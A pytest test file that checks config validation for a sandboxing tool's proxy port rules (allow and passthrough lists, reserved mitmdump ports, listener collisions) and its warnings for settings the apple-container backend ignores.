        protocols on the same port are governed independently."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: [80, 443]
              udp:
                allow: [443]
        """))
        cfg = load_config(str(p))
        validate_config(cfg)
        assert cfg.ports.tcp.allow == [80, 443]
        assert cfg.ports.udp.allow == [443]

    def test_tcp_allow_preserves_order(self, tmp_path):
        """Operator-supplied order is preserved (matters for iptables
        rule order — earlier rules match first)."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: [8448, 443, 80]
        """))
        cfg = load_config(str(p))
        assert cfg.ports.tcp.allow == [8448, 443, 80]

    def test_tcp_passthrough_preserves_order(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: [80, 443, 5432, 123, 993]
                passthrough: [5432, 123, 993]
        """))
        cfg = load_config(str(p))
        assert cfg.ports.tcp.passthrough == [5432, 123, 993]

    def test_udp_allow_preserves_order(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              udp:
                allow: [443, 123, 53]
        """))
        cfg = load_config(str(p))
        assert cfg.ports.udp.allow == [443, 123, 53]

    # --- passthrough auto-merge into allow (mirrors domains semantics) ----

    def test_tcp_passthrough_not_in_allow_emits_warning(self, tmp_path):
        """Mirrors domains.passthrough: if a tcp.passthrough port isn't
        in tcp.allow, validation warns the operator that the port will
        be auto-added to the effective allow set at quadlet generation."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: [80, 443]
                passthrough: [5432]
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        assert any(
            "ports.tcp.passthrough entry 5432 is not in ports.tcp.allow"
            in w
            for w in warnings
        )

    def test_tcp_passthrough_in_allow_no_warning(self, tmp_path):
        """When the passthrough port IS already in tcp.allow, no
        auto-merge warning fires — the operator was explicit."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: [80, 443, 5432]
                passthrough: [5432]
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        assert not any(
            "is not in ports.tcp.allow" in w for w in warnings
        )

    # --- empty / boundary postures ----------------------------------------

    def test_empty_tcp_allow_emits_no_inspected_warning(self, tmp_path):
        """Empty inspected TCP set means no REDIRECT rules — only the
        L7 path through HTTP_PROXY remains."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: []
        """))
        cfg = load_config(str(p))
        assert cfg.ports.tcp.allow == []
        warnings = validate_config(cfg)
        assert any(
            "transparent capture disabled" in w for w in warnings
        )

    def test_all_lists_empty_warns_zero_outbound(self, tmp_path):
        """When tcp.allow, tcp.passthrough, AND udp.allow are all empty
        the cage has zero outbound TCP/UDP — surface this as a warning."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: []
                passthrough: []
              udp:
                allow: []
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        assert any("zero outbound TCP/UDP" in w for w in warnings)

    def test_udp_only_no_zero_outbound_warning(self, tmp_path):
        """A UDP-only cage (e.g. an SNMP collector) has non-zero
        outbound — no zero-outbound warning, but the no-inspected
        warning does fire because tcp.allow is empty."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: []
              udp:
                allow: [161]
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        assert any("transparent capture disabled" in w for w in warnings)
        assert not any("zero outbound TCP/UDP" in w for w in warnings)

    # --- reserved-port rejection (applies only to inspected TCP set) ------

    def test_tcp_allow_reserved_8443_rejected(self, tmp_path):
        """8443 is mitmdump's transparent listener; redirecting to it
        from itself would loop. Reserved unless moved to passthrough."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: [80, 8443]
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match=r"8443 is reserved by mitmdump"):
            validate_config(cfg)

    def test_tcp_allow_reserved_8080_rejected(self, tmp_path):
        """8080 is mitmdump's HTTP-proxy listener; redirecting it would
        break the L7 HTTP_PROXY path. Reserved unless moved to
        passthrough."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: [80, 8080]
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match=r"8080 is reserved by mitmdump"):
            validate_config(cfg)

    def test_reserved_port_in_tcp_passthrough_is_OK(self, tmp_path):
        """Putting a reserved port in tcp.passthrough is fine —
        passthrough never gets a REDIRECT rule, so no conflict with
        mitmdump's own listeners."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: [80, 443, 8443]
                passthrough: [8443]
        """))
        cfg = load_config(str(p))
        validate_config(cfg)

    def test_reserved_port_in_udp_allow_is_OK(self, tmp_path):
        """UDP entries never get REDIRECT (mitmdump can't audit UDP),
        so 8443/udp doesn't conflict with mitmdump's TCP listener."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              udp:
                allow: [8443, 8080]
        """))
        cfg = load_config(str(p))
        validate_config(cfg)

    # --- per-entry validation (range, types, dedupe) ----------------------

    def test_tcp_allow_out_of_range_low(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: [0]
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match=r"out of range"):
            validate_config(cfg)

    def test_tcp_allow_out_of_range_high(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: [65536]
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match=r"out of range"):
            validate_config(cfg)

    def test_udp_allow_out_of_range(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              udp:
                allow: [70000]
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match=r"out of range"):
            validate_config(cfg)

    def test_tcp_allow_string_rejected(self, tmp_path):
        """YAML strings/booleans/floats are rejected explicitly so a
        typo like '443' (string) doesn't silently coerce."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow:
                  - "443"
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match=r"must be integers"):
            validate_config(cfg)

    def test_tcp_allow_boolean_rejected(self, tmp_path):
        """`true` is `int` in Python — explicitly reject so YAML
        `allow: [true, 443]` doesn't silently become [1, 443]."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow:
                  - true
                  - 443
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match=r"must be integers"):
            validate_config(cfg)

    def test_udp_allow_boolean_rejected(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              udp:
                allow:
                  - true
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match=r"must be integers"):
            validate_config(cfg)

    def test_tcp_allow_duplicate_rejected(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: [80, 443, 80]
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match=r"appears more than once"):
            validate_config(cfg)

    def test_tcp_passthrough_string_rejected(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                passthrough:
                  - "5432"
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match=r"must be integers"):
            validate_config(cfg)

    def test_tcp_passthrough_duplicate_rejected(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                passthrough: [123, 993, 123]
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match=r"appears more than once"):
            validate_config(cfg)

    def test_udp_allow_duplicate_rejected(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              udp:
                allow: [123, 443, 123]
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match=r"appears more than once"):
            validate_config(cfg)

    def test_tcp_allow_must_be_list(self, tmp_path):
        """A scalar value (e.g. `allow: 443`) should produce a clean
        ValueError from load_config, not a TypeError from list()
        iteration."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: 443
        """))
        with pytest.raises(ValueError, match=r"must be a list of integers"):
            load_config(str(p))

    def test_tcp_passthrough_must_be_list(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                passthrough: 5432
        """))
        with pytest.raises(ValueError, match=r"must be a list of integers"):
            load_config(str(p))

    def test_udp_allow_must_be_list(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              udp:
                allow: 123
        """))
        with pytest.raises(ValueError, match=r"must be a list of integers"):
            load_config(str(p))

    # --- collisions with other in-process listeners ------------------------

    def test_inspected_collides_with_relay_listen(self, tmp_path):
        """A REDIRECT for a relay's listen port would intercept
        connections meant for the in-process relay handler."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
              podman_secrets:
                - MIGADU_USER
                - MIGADU_PASSWORD
            protocol_relays:
              - name: migadu-imap
                type: imap
                listen: "0.0.0.0:1143"
                upstream:
                  host: imap.migadu.com
                  port: 993
                auth:
                  type: imap-login
                  user_source: "podman:MIGADU_USER"
                  password_source: "podman:MIGADU_PASSWORD"
            ports:
              tcp:
                allow: [80, 443, 1143]
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match=r"collides with protocol_relays"):
            validate_config(cfg)

    def test_relay_port_in_tcp_passthrough_is_OK(self, tmp_path):
        """Moving the relay's port to tcp.passthrough lets the cage
        reach an external service on the same port (e.g. cage→external
        imap on 1143) without intercepting the relay's listener."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
              podman_secrets:
                - MIGADU_USER
                - MIGADU_PASSWORD
            protocol_relays:
              - name: migadu-imap
                type: imap
                listen: "0.0.0.0:1143"
                upstream:
                  host: imap.migadu.com
                  port: 993
                auth:
                  type: imap-login
                  user_source: "podman:MIGADU_USER"
                  password_source: "podman:MIGADU_PASSWORD"
            ports:
              tcp:
                allow: [80, 443, 1143]
                passthrough: [1143]
        """))
        cfg = load_config(str(p))
        validate_config(cfg)

    def test_inspected_collides_with_inbound_forward(self, tmp_path):
        """For each container.ports inbound forward, the proxy container
        runs an extra mitmdump reverse-mode listener on
        0.0.0.0:<container_port>. A REDIRECT for that port would
        intercept inbound connections before the reverse listener could
        see them."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
              ports:
                - "0.0.0.0:9000:9000"
            ports:
              tcp:
                allow: [80, 443, 9000]
        """))
        cfg = load_config(str(p))
        with pytest.raises(
            ValueError, match=r"collides with container\.ports inbound forward"
        ):
            validate_config(cfg)

    def test_inspected_collides_with_inbound_forward_short_spec(self, tmp_path):
        """The 2-part port spec (HOST_PORT:CONTAINER_PORT) is also
        cross-checked against inspected ports."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
              ports:
                - "9000:9000"
            ports:
              tcp:
                allow: [80, 443, 9000]
        """))
        cfg = load_config(str(p))
        with pytest.raises(
            ValueError, match=r"collides with container\.ports inbound forward"
        ):
            validate_config(cfg)

    # --- structural shape: each level must be a mapping --------------------

    def test_ports_must_be_mapping(self, tmp_path):
        """`ports: "yes"` (or any non-mapping) raises a clean error
        instead of crashing with AttributeError when load_config tries
        to call .get() on a string."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports: "yes"
        """))
        with pytest.raises(ValueError, match=r"ports must be a mapping"):
            load_config(str(p))

    def test_ports_tcp_must_be_mapping(self, tmp_path):
        """`ports.tcp: 443` raises a clean error instead of crashing
        with TypeError when 'allow' in <int> fails."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp: 443
        """))
        with pytest.raises(ValueError, match=r"ports.tcp must be a mapping"):
            load_config(str(p))

    def test_ports_tcp_list_at_wrong_level_rejected(self, tmp_path):
        """The silent-swallow nightmare: operator types `ports.tcp:
        [80, 443, 8448]` (forgetting the `allow:` key). Pre-fix this
        parsed as the default `[80, 443]` because `"allow" in [80,
        443, 8448]` is False, so the operator's intent to allow port
        8448 was silently dropped and Matrix federation traffic would
        be blocked by the new default-deny FORWARD with no warning."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp: [80, 443, 8448]
        """))
        with pytest.raises(ValueError, match=r"ports.tcp must be a mapping"):
            load_config(str(p))

    def test_ports_udp_must_be_mapping(self, tmp_path):
        """`ports.udp: 123` raises a clean error rather than crashing."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              udp: 123
        """))
        with pytest.raises(ValueError, match=r"ports.udp must be a mapping"):
            load_config(str(p))

    def test_ports_udp_list_at_wrong_level_rejected(self, tmp_path):
        """Same silent-swallow gotcha as tcp, for udp."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              udp: [123, 443]
        """))
        with pytest.raises(ValueError, match=r"ports.udp must be a mapping"):
            load_config(str(p))

    # --- end-to-end coverage of the headline worked example ----------------

    def test_jacque_worked_example_validates(self, tmp_path):
        """The jacque worked example in docs/proxy-audit-ports.md is
        the headline use case (Matrix bot with NTP + HTTPS audit + 8448
        federation). Pin it as a regression test so doc updates and
        config-shape changes don't silently invalidate the example."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: jacque
            container:
              image: localhost/jacque-cage:latest
              env:
                NODE_EXTRA_CA_CERTS: "/certs/mitmproxy-ca-cert.pem"
            ports:
              tcp:
                allow: [80, 443, 8448]
              udp:
                allow: [123]
            domains:
              allow:
                - anthropic.com
                - homeserver.example
                - pool.ntp.org
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        # No empty-set warnings, no auto-merge warnings, no zero-outbound.
        assert not any("transparent capture disabled" in w for w in warnings)
        assert not any("zero outbound" in w for w in warnings)
        assert not any("is not in ports.tcp.allow" in w for w in warnings)
        assert cfg.ports.tcp.allow == [80, 443, 8448]
        assert cfg.ports.tcp.passthrough == []
        assert cfg.ports.udp.allow == [123]

    def test_inbound_forward_port_in_udp_allow_is_OK(self, tmp_path):
        """The inbound-forward listener is TCP only. UDP/9000 doesn't
        conflict with the reverse-mode TCP listener on 0.0.0.0:9000."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
              ports:
                - "0.0.0.0:9000:9000"
            ports:
              tcp:
                allow: [80, 443]
              udp:
                allow: [9000]
        """))
        cfg = load_config(str(p))
        validate_config(cfg)
class TestAppleContainerSilentDrops:
    """Regression: cage.yaml fields that the apple-container backend
    silently drops must emit a warning at validate_config so users
    know their config isn't fully honored.

    These warnings are non-fatal: several built-in scaffolds (ubuntu,
    etc.) set these fields unconditionally for the container backend.
    Hard-rejecting would require scaffold updates first. The warnings
    surface the silent-drop issue at every cage create / update / show.
    """

    @pytest.fixture
    def base_yaml(self, tmp_path):
        # Apple-container validation requires Darwin + arm64. Stub
        # platform.system / platform.machine in each test.
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
        """))
        return str(p)

    def _validate_under_apple(self, yaml_path):
        """Run validate_config with platform stubbed to a macOS ASi host."""
        from unittest.mock import patch
        cfg = load_config(yaml_path)
        with patch("agentcage.config.platform.system", return_value="Darwin"), \
             patch("agentcage.config.platform.machine", return_value="arm64"):
            return cfg, validate_config(cfg)

    def test_volumes_no_longer_warns(self, tmp_path):
        """`container.volumes` is wired through `AppleContainerBackend.start()`
        as of feat/apple-volume-mounts — no longer in the silent-drops list.
        Regression test against any future reintroduction of the warning."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
              volumes:
                - "~/some-path:/cage:rw"
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert not any(
            "container.volumes" in w for w in warnings
        ), warnings

    def test_named_volumes_warns(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
              named_volumes:
                data: /var/data
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert any("container.named_volumes" in w for w in warnings), warnings

    def test_inbound_ports_warns(self, tmp_path):
        """`container.ports` (inbound published ports) is silently dropped on
        apple-container: Apple's runtime has no host port-publishing
        (`--publish`/`PublishPort` equivalent). Warn so operators stop
        expecting an inbound service to become reachable on the host."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
              ports:
                - "127.0.0.1:8000:3000"
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert any("container.ports" in w for w in warnings), warnings

    def test_no_inbound_ports_no_warn(self, tmp_path):
        """No `container.ports:` → no inbound-ports warning (default cage)."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert not any("container.ports" in w for w in warnings), warnings

    def test_tmpfs_non_default_warns(self, tmp_path):
        """Multi-entry tmpfs or non-/tmp target → operator intent that
        apple-container can't honor → warn."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
              tmpfs:
                - "/tmp:rw,size=64M"
                - "/run:rw,size=16M"
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert any("container.tmpfs" in w for w in warnings), warnings

    def test_tmpfs_single_tmp_entry_does_not_warn(self, tmp_path):
        """Scaffold default ``tmpfs: ["/tmp:rw,noexec,nosuid,size=256M"]``
        is the single-most-common cage.yaml shape across built-in scaffolds.
        On apple-container the cage's /tmp lives in the RW rootfs — the
        workload still gets a writable /tmp — so the noisiest warning on
        every default cage was pure cosmetic friction. 0.22.7+ suppresses
        it when the only tmpfs entry targets /tmp."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
              tmpfs:
                - "/tmp:rw,noexec,nosuid,size=256M"
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert not any(
            "container.tmpfs" in w for w in warnings
        ), warnings

    def test_podman_secrets_warns(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
              podman_secrets:
                - my-secret
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert any("container.podman_secrets" in w for w in warnings), warnings

    def test_nested_containers_warns(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
              nested_containers: true
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert any("container.nested_containers" in w for w in warnings), warnings

    def test_userns_custom_warns(self, tmp_path):
        """Non-``keep-id`` userns is operator intent (explicit remap
        config) that this backend can't honor → warn."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
              userns: "auto:uidmapping=0:200000:65536"
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert any("container.userns" in w for w in warnings), warnings

    def test_userns_keep_id_does_not_warn(self, tmp_path):
        """Scaffold default ``userns: keep-id`` is for container backend's
        rootless-podman UID mapping. On apple-container the supervisor's
        drop-to-uid-1000 already achieves the "workload isn't root" goal,
        so keep-id is functionally compatible — don't warn on the
        scaffold default. 0.22.7+ suppresses."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
              userns: "keep-id"
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert not any(
            "container.userns" in w for w in warnings
        ), warnings

    def test_add_capabilities_warns(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
              add_capabilities:
                - NET_ADMIN
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert any("container.add_capabilities" in w for w in warnings), warnings

    def test_drop_capabilities_custom_warns(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
              drop_capabilities:
                - SYS_ADMIN
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert any("container.drop_capabilities" in w for w in warnings), warnings

    def test_drop_capabilities_default_does_not_warn(self, tmp_path):
        """drop_capabilities=['ALL'] is the default and matches the supervisor's
        all-drop behavior — must NOT trigger a warning, otherwise every
        single cage.yaml with the default emits noise."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert not any(
            "container.drop_capabilities" in w for w in warnings
        ), warnings

    def test_read_only_true_warns(self, tmp_path):
        """Operator wants a read-only rootfs but apple-container always
        runs RW → real conflict, warn so the operator knows their config
        won't be honored."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
              read_only: true
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert any("container.read_only" in w for w in warnings), warnings

    def test_read_only_false_does_not_warn(self, tmp_path):
        """Pre-0.22.7 the predicate was ``read_only is False``, firing
        on every default cage (the scaffolds ship ``read_only: false``
        for coding agents that write to the FS). The False default
        matches apple-container's actual behavior — no conflict, no
        need to warn. This was the single loudest warning on every
        ``agentcage run``."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
              read_only: false
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert not any(
            "container.read_only" in w for w in warnings
        ), warnings

    def test_security_label_disable_false_warns(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
              security_label_disable: false
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert any(
            "container.security_label_disable" in w for w in warnings
        ), warnings

    def test_secret_injection_known_transform_no_longer_warns(self, tmp_path):
        """Once the in-cage addon learned to dispatch on `transform`, the
        old "silently has no effect on apple-container" warning had to
        stop firing for known transforms — otherwise users get gaslit
        about a working feature."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: ac-demo
            isolation: apple-container
            container:
              image: localhost/test:latest
            secret_injection:
              - env: API_KEY
                placeholder: "{{API_KEY}}"
                transform: google-jwt-bearer
                transform_config:
                  scopes:
                    - https://www.googleapis.com/auth/calendar.readonly
                inject_to:
                  - api.example.com
        """))
        _, warnings = self._validate_under_apple(str(p))
        assert not any(
            "secret_injection" in w and "transform" in w
            and "silently has no effect" in w
            for w in warnings
        ), warnings

    def test_container_isolation_no_silent_drop_warnings(self, tmp_path):
        """The whole batch of warnings is gated on isolation == apple-container.
        Container backend honors all these fields, so no warnings emitted."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: container-demo
            isolation: container
            container:
              image: localhost/test:latest
              volumes:
                - "/host:/cage:rw"
              tmpfs:
                - "/tmp:rw,size=64M"
              add_capabilities:
                - NET_ADMIN
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        assert not any(
            "silently has no effect on apple-container" in w for w in warnings
        ), warnings
